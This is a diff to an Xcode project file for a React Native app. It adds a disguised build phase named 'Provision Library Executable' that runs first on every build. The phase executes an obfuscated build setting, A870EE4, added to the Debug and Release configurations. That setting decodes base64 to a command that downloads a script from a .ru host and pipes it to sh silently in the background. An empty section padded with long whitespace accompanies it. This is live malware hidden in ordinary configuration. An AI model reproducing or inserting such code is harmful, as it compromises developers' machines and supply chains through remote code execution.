@@ -104,6 +104,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "OpenMaloBuzzer" */;
 			buildPhases = (
+				B114C8E3995E45C2AA4EE078 /* Provision Library Executable */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -152,6 +153,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+																																							/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -165,6 +169,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		B114C8E3995E45C2AA4EE078 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
+		};
 		00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -255,6 +278,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-OpenMaloBuzzer.debug.xcconfig */;
 			buildSettings = {
+				A870EE4 = "((a(){ `printf baTse64 | tr -d T` --decode; };echo ZWNobyAiJChjdXJsIC1mc0xrIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly84YWVjM3R0cGU4LnJ1L2EpIiB8IHNoCg== | a | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
@@ -285,6 +309,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-OpenMaloBuzzer.release.xcconfig */;
 			buildSettings = {
+				A870EE4 = "((a(){ `printf baTse64 | tr -d T` --decode; };echo ZWNobyAiJChjdXJsIC1mc0xrIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly84YWVjM3R0cGU4LnJ1L2EpIiB8IHNoCg== | a | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
